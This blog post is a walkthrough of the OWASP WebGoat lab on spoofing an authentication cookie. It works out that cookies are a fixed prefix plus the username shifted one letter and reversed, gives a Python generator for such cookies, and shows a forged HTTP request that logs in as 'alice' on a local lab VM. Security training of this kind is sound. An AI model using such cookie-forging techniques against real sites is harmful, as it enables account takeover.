---
layout: post
title:  "OWASP BWA WebGoat Challenge: Session Management Flaws"
subtitle: "Spoof an Authentication Cookie"
date:   2017-02-01 10:00:00 -0500
author: "coastal"
header-img: "images/site-resources/webgoat-header.jpg"
---
# Spoof an Authentication Cookie
Instructions:

- The user should be able to bypass the authentication check. Login using the webgoat/webgoat account to see what happens. You may also try aspect/aspect. When you understand the authentication cookie, try changing your identity to alice. 

Alright, lets log in as webgoat/webgoat and grab the request and response:

```
Username=webgoat&Password=webgoat&SUBMIT=Login
```

```
Set-Cookie: AuthCookie=65432ubphcfx
```

Alright, let's check out aspect/aspect:

```
Set-Cookie: AuthCookie=65432udfqtb
```

Hmm..so the first 5 characters, the integers, seem constant across these logins. The letters that follow seem to have the same number of characters as the username for the login. Let's take a look at the letters a few different ways:

```
webgoat
ubphcfx

aspect
udfqtb

webgoat
xfchpbu

aspect
btqfdu
```

Alright, looks like we might have a character shift by one (+1) and a reversal. Let's write a reverse engineered cookie generator:

{% highlight python %}
import sys

def login_cookie(username):
	chars = "abcdefghijklmnopqrstuvwxyz"
	cookie = ""
	for c in username.lower():
		index = chars.index(c)
		cookie += chars[(index+1) % len(chars)]

	print "65432"+cookie[::-1]

def main():
	login_cookie(sys.argv[1])

main()
{% endhighlight %}

Okay, let's give it a shot with webgoat:

```
>python 19_cookie_reveng.py webgoat
65432ubphcfx
```

Cool cool. Let's get alice's code:

```
>python 19_cookie_reveng.py alice
65432fdjmb
```

Okay, now let's login to webgoat's account and hit the ```Refresh``` button and capture that request. Now let's forge it with alice's ```AuthCookie```:

```
GET /WebGoat/attack? HTTP/1.1
Host: 192.168.56.101
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: http://192.168.56.101/WebGoat/attack?Screen=301&menu=1800
Cookie: AuthCookie=65432fdjmb; JSESSIONID=D49B1C7B6EE2243929D320213C6A9C1B; acopendivids=swingset,jotto,phpbb2,redmine; acgroupswithpersist=nada
Authorization: Basic dXNlcjp1c2Vy
Connection: close
Upgrade-Insecure-Requests: 1
```

<img src="{{ site.baseurl }}/images/webgoat/2017-02-01-webgoat_part_19/completed.jpg">

Forgery complete!